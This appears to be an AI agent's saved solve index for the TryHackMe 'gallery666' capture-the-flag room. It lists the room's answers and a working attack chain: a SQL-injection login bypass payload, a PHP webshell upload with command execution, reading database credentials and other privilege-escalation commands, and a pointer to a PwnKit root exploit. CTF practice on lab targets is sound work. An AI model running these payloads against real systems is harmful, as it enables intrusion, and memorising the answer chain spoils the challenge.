# THM Gallery (gallery666) — Solve Index

> Mirror of auto-memory `reference_thm_gallery666.md`. Lives in repo so it survives across machines / sessions. **Read this BEFORE attacking — do not improvise.**

Room: https://tryhackme.com/room/gallery666 (Easy, 45 min, by Mikaa).
CMS: **Simple Image Gallery System v1.0 by oretnom23** (footer says so).

## Task 1 answer chain (in order)

| # | Question | Answer | How |
|---|----------|--------|-----|
| 1 | How many ports are open? | **3** | `nmap -sC -sV -p- <ip>` → 22 ssh / 80 http (default Apache) / 8080 http (the CMS) |
| 2 | What's the name of the CMS? | **Simple Image Gallery** | port 8080 http-title; or check footer of `/gallery/admin/login.php` ("Gallery (by: oretnom23) v1.0") |
| 3 | What's the hash password of the admin user? | **<hash>** | MD5 of admin's password from `gallery_db.users`. Get via SQLi auth bypass or by reading config after RCE. |
| 4 | What's the user flag? | **THM{<redacted>}** | located at `/home/mike/user.txt` |

## Working attack path (validated, ~1 hour total)

1. **Recon**: nmap full-port. Three ports: 22, 80 (default Apache "It works" page), 8080 (Simple Image Gallery System). The CMS is on **port 8080**, NOT 80. Many internal links *render* with port 80 in URLs because the CMS hardcodes a base URL — those are red herrings.

2. **CMS identification**: visit `:8080/gallery/` → AdminLTE-style site. Footer of admin login page reveals `Gallery (by: oretnom23) v1.0` — search exploit-db for **Simple Image Gallery System v1.0** → TC_49675 (arbitrary file upload).

3. **Auth bypass via SQLi** on `Login.php?f=login`:
   - Endpoint: `POST http://<ip>/gallery/classes/Login.php?f=login` — **must be on port 80, not 8080** (port-8080 returns broken redirect HTML for POSTs even though the CMS is "on" 8080. PHP session cookie is shared between ports because PHP session is server-wide, so authenticate on 80 and reuse the cookie on 8080).
   - Payload: `username=admin' OR 1=1-- -&password=x`
   - Successful response is exactly `{"status":"success"}` (Content-Length: 20). PHPSESSID cookie returned in response.

4. **Webshell upload via SystemSettings update_settings** (TC_49675):
   - `POST :80/gallery/classes/SystemSettings.php?f=update_settings` (port 80!)
   - Multipart: include `name=`, `email=`, `shortname=`, plus a file field — fields tested working: `logo` / `cover` / `img`. CMS accepts `.php` with image MIME type spoof.
   - Response body `1` = success.
   - **CMS renames the file to `<unix_timestamp>_<original>.php`**. Find the actual filename by scraping the public homepage (`curl :8080/gallery/` and grep `src="..uploads/..php"`) — the new logo URL contains the renamed shell.
   - Final URL: `http://<ip>/gallery/uploads/<timestamp>_shell.php?c=<cmd>` (port 80 serves PHP execution; port 8080 serves the file but parent CMS framework sometimes returns the index template — always use **port 80** for shell execution).

5. **RCE as www-data**: `?c=id` returns `uid=33(www-data)...`. Use `curl --data-urlencode "c=<command>" -G "$SHELL_URL"` so spaces and quotes survive.

6. **Find DB creds**: `cat /var/www/html/gallery/initialize.php` →
   - `DB_USERNAME = gallery_user`
   - `DB_PASSWORD = <practice-box-password>`
   - These do NOT reuse to mike's SSH password. Don't waste time SSH-bruting <practice-box-password> for mike.

7. **Privesc www-data → mike** (the exact intended trick is unconfirmed in current notes — 2026-04-29 attempt stalled here). When re-solving, immediately check, in this order:
   - `sudo -l` for any nopasswd entries on www-data running as mike
   - `getfacl /home/mike /home/mike/user.txt` — Easy boxes commonly use ACLs to grant www-data read on user.txt
   - `find / -group mike -readable -type f 2>/dev/null` and `find / -user mike -perm -004 -type f 2>/dev/null`
   - `cat /etc/crontab; ls -la /etc/cron.*` — look for jobs running as mike that touch www-data writable paths
   - Read `/var/log/auth.log` and `/var/log/apache2/access.log` for password leakage in URL params
   - Check `/opt/`, `/var/backups/`, `/tmp/` for forgotten cred files
   - Try `su mike` via `python3 -c 'import pty; pty.spawn("/bin/su mike")'` then feed candidate passwords (NOT plain `echo | su` — su needs a TTY)
   - **The MD5 hash `<hash>` is NOT in rockyou.txt — do not waste cycles on that.**

## Task 2 (root via PwnKit)

Room title hints "Gallery PwnKit Solve" — root path is **CVE-2021-4034 (pwnkit)**. Once on mike, drop a pwnkit PoC and exec for root. (Not in scope when only user flag is required.)

## Anti-patterns observed in 2026-04-29 re-solve

- Spent ~30 min fighting port 80 vs 8080 instead of immediately recognizing **classes/\* endpoints serve on 80, admin/\* serves on 8080, sessions are shared**.
- Used `--quiet` with hashcat so could not see "exhausted" status — wasted time wondering if it was still running. Drop `--quiet` and look for `Status: Exhausted`.
- Did NOT pre-check this index before attacking. Result: improvised a path that mostly worked but stalled on privesc step that the real solve handled in seconds. **Always read this file FIRST when attacking gallery666.**

## Generic CTF SOP (apply to other rooms too)

Before attacking any THM room with prior history:
1. Grep `C:/Users/user/.claude/projects/*/memory/` and the project's `docs/ctf_walkthroughs/` for an existing index.
2. If hit → follow the documented path, only deviate when current state demonstrably differs.
3. If miss → `WebSearch "tryhackme <room> writeup"` before starting nmap. WebSearch is allowed. Do not random-walk.
4. After any solve (success or failure), append a fresh index file `thm_<room>.md` so the next attempt is fast.
